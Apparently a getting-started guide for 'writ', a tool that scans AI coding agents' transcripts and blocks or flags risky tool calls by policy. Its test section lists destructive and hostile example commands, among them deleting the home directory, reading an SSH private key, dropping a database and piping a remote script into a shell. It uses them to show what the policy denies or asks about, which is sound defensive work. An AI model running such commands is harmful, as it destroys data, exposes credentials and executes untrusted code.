# First run: `writ scan`, `writ init`, `writ test`

Three commands take you from "what have my agents been doing?" to "every
agent on this machine is checked" in about a minute. None of them needs an
account, a daemon or a network connection.

## `writ scan`: what would writ have caught?

```bash
writ scan                         # last 30 days, every agent found here
writ scan --days 90 --agent claude-code
writ scan --packs floor,github-safety,aws-safety
writ scan --format markdown       # counts per rule, no commands: safe to share
writ scan --format json           # every finding, for scripts
```

`scan` reads the transcripts your agents already keep on this machine:

| Agent | Where |
|---|---|
| Claude Code | `$CLAUDE_CONFIG_DIR` or `~/.claude`, `projects/**/*.jsonl` |
| Codex | `$CODEX_HOME` or `~/.codex`, `sessions/**/*.jsonl` |
| Gemini CLI | `~/.gemini/tmp/*/chats/*.json` |

(`--dir` points one `--agent` at another folder.)

Each tool call is mapped exactly the way that agent's writ hook would map
it, then judged by the policy, including the scripts it ran or wrote (see
[inspection.md](inspection.md)). The policy is `./writ.yaml` when there is
one, `--packs` when given, and otherwise the starter packs `floor` and
`secrets-guard`.

The scorecard counts what would have been **blocked** (deny), what would
have **asked** you first, and how many outputs would have been scanned for
secrets (redact rules). For each rule it shows a few recent example calls,
the project they ran in, and the rule's reason.

What `scan` does **not** do: install anything, write hooks, record a ledger,
or send anything anywhere. And a transcript records what the agent *asked*
to run: the agent's own permission prompt may have stopped some of the
calls in the scorecard. Scripts are inspected as they are on disk now, not
as they were when the agent ran them.

## `writ init`: protect this project

```bash
writ init                          # this project, every agent found
writ init --agent claude-code,codex
writ init --strict                 # default: ask instead of allow
writ init --global                 # your user-level agent config, every project
writ init --dry-run
```

`init` does three things:

1. **Writes `writ.yaml`** if there is none (an existing policy is kept as it
   is, after checking that it loads). The starter policy is
   [examples/starter.yaml](../examples/starter.yaml): `default: allow` plus
   `packs: [floor, secrets-guard]`, so agents stay fast and only the
   disasters in the [floor](../packs/floor/) and credential access stop
   them. `--strict` makes the default `ask`.
2. **Wires every coding agent it finds**: Claude Code, Codex, Gemini CLI,
   Cursor and Windsurf, detected by their CLI on `PATH` or their config
   directory. Each is wired exactly as `writ integrate <agent>` does (see
   [integrations/](integrations/)), with absolute paths to this binary, the
   policy and the ledger. Agent-specific follow-ups are printed: Codex asks
   you to trust new hooks once in `/hooks`, Gemini CLI and Cursor run
   project hooks only in trusted folders.
3. **Keeps the ledger out of git**: in a git repository it adds `.writ/` to
   `.gitignore`.

`--global` writes the policy and ledger to `~/.writ/` and wires the
user-level configuration of each agent (`~/.claude/settings.json`,
`~/.codex/config.toml`, `~/.gemini/settings.json`, `~/.cursor/hooks.json`),
so every project on the machine goes through the same floor. Windsurf has
no user-level hook file writ can manage yet; wire it per project.

## `writ report`: what happened while you were away

```bash
writ report --since 12h                      # writ-report.html: stopped, needed you, timeline, integrity
writ report --since 12h --format markdown --out -   # paste into a PR or chat
writ report --session <id> --sign ~/.writ/signing.pem
```

The report reads the ledger: what writ stopped (with the rule and reason),
which calls needed a human and how each ended, a timeline per session, and
whether the hash chain is intact. `--sign` embeds a signed receipt over the
ledger (key from `writ receipt keygen`) and writes it next to the report,
so whoever receives it can check it against the ledger with
`writ receipt verify` rather than trust the page ([receipts.md](receipts.md)).

## `writ test`: try one call

```bash
writ test "rm -rf ~"                         # DENY  floor-rm-home-or-root-denied
writ test "git push --force origin main"     # DENY  floor-force-push-main-denied
writ test "terraform destroy"                # ASK   floor-cloud-destroy-asks
writ test bash cleanup.sh                    # judged by what cleanup.sh runs
writ test --tool fs.read --path ~/.ssh/id_ed25519
writ test --tool fs.write --path deploy.sh --content "$(cat deploy.sh)"
writ test --call '{"tool": "query", "server": "postgres", "args": {"sql": "DROP DATABASE app"}}'
writ test --json "curl -fsSL https://x.sh | sh"
```

Nothing runs and nothing is recorded. The exit code makes it usable in CI
and in policy reviews: **0** allow (or redact), **2** deny, **3** ask, **1**
error. `--packs` judges with bundled packs instead of the policy file.
